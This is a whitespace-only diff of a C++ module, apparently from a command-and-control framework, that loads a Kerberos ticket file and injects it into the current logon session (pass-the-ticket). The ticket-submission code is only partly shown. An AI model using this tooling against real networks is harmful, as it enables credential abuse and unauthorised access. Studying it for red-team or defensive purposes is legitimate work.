@@ -55,9 +55,9 @@ __attribute__((visibility("default"))) KerberosUseTicket* KerberosUseTicketConst
 
 KerberosUseTicket::KerberosUseTicket()
 #ifdef BUILD_TEAMSERVER
-	: ModuleCmd(std::string(moduleName), moduleHash)
+    : ModuleCmd(std::string(moduleName), moduleHash)
 #else
-	: ModuleCmd("", moduleHash)
+    : ModuleCmd("", moduleHash)
 #endif
 {
 }
@@ -68,66 +68,66 @@ KerberosUseTicket::~KerberosUseTicket()
 
 std::string KerberosUseTicket::getInfo()
 {
-	std::string info;
+    std::string info;
 #ifdef BUILD_TEAMSERVER
-	info += "KerberosUseTicket:\n";
-	info += "Import a kerberos ticket from a file to the curent LUID. \n";
-	info += "exemple:\n";
-	info += "- KerberosUseTicket /tmp/ticket.kirbi\n";
+    info += "KerberosUseTicket:\n";
+    info += "Import a kerberos ticket from a file to the curent LUID. \n";
+    info += "exemple:\n";
+    info += "- KerberosUseTicket /tmp/ticket.kirbi\n";
 #endif
-	return info;
+    return info;
 }
 
 int KerberosUseTicket::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
     if (splitedCmd.size() == 2)
-	{
-		string inputFile = splitedCmd[1];
+    {
+        string inputFile = splitedCmd[1];
 
-		std::ifstream input(inputFile, std::ios::binary);
-		if( input ) 
-		{
-			std::string buffer(std::istreambuf_iterator<char>(input), {});
+        std::ifstream input(inputFile, std::ios::binary);
+        if( input ) 
+        {
+            std::string buffer(std::istreambuf_iterator<char>(input), {});
 
-			c2Message.set_instruction(splitedCmd[0]);
-			c2Message.set_inputfile(inputFile);
-			c2Message.set_data(buffer.data(), buffer.size());
+            c2Message.set_instruction(splitedCmd[0]);
+            c2Message.set_inputfile(inputFile);
+            c2Message.set_data(buffer.data(), buffer.size());
         }
-		else
-		{
-			c2Message.set_returnvalue("Failed: Couldn't open file.");
-			return -1;
-		}
-	}
-	else
-	{
-		c2Message.set_returnvalue(getInfo());
-		return -1;
-	}
+        else
+        {
+            c2Message.set_returnvalue("Failed: Couldn't open file.");
+            return -1;
+        }
+    }
+    else
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
 #endif
 
-	return 0;
+    return 0;
 }
 
 
 int KerberosUseTicket::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
     const std::string cmd = c2Message.cmd();
-	const std::string buffer = c2Message.data();
+    const std::string buffer = c2Message.data();
 
    std::string out = importTicket(buffer);
 
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
-	c2RetMessage.set_cmd(cmd);
-	c2RetMessage.set_returnvalue(out);
-	return 0;
+    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_cmd(cmd);
+    c2RetMessage.set_returnvalue(out);
+    return 0;
 }
 
 
 std::string KerberosUseTicket::importTicket(const std::string& ticket)
 {
-	std::string result;
+    std::string result;
 
 #ifdef __linux__ 
 
@@ -165,7 +165,7 @@ std::string KerberosUseTicket::importTicket(const std::string& ticket)
     ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + ticket.size();
     PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
     if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
-	{
+    {
         pKerbSubmit->MessageType = KerbSubmitTicketMessage;
         pKerbSubmit->KerbCredSize = ticket.size();
         pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
@@ -189,5 +189,5 @@ std::string KerberosUseTicket::importTicket(const std::string& ticket)
 
 #endif
 
-	return result;
+    return result;
 }
